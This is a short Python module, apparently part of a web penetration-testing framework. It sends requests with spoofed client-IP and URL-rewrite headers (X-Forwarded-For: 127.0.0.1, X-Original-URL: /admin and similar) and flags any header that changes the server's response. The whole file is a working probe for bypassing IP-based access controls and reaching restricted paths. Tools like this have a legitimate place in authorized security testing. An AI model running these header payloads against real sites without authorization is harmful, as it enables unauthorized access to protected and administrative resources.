"""header_spoof — inject IP-spoofing headers to bypass IP-based filters"""
from core.http import HttpClient

HEADERS = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Forwarded-For", "10.0.0.1"),
    ("X-Forwarded-For", "192.168.1.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Remote-Addr", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Host", "127.0.0.1"),
    ("X-Forwarded-Host", "127.0.0.1"),
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("True-Client-IP", "127.0.0.1"),
    ("CF-Connecting-IP", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("Forwarded", "for=127.0.0.1;host=127.0.0.1;proto=https"),
]

class HeaderSpoof:
    def run(self, session, logger):
        http = HttpClient(session, logger)
        base = http.get(session.target)
        base_code = base.status_code if base else None
        print(f"[header_spoof] baseline={base_code}, testing {len(HEADERS)} headers")
        results = []
        for name, val in HEADERS:
            r = http.get(session.target, headers={name: val})
            code = r.status_code if r else None
            if code != base_code:
                results.append({"header":name,"value":val,"code":code})
                print(f"  [!] {name}: {base_code} -> {code}")
                logger.finding("header_spoof","medium",f"{name} changes response {base_code}->{code}")
        print(f"[header_spoof] {len(results)} headers change response")
        return {"results": results}
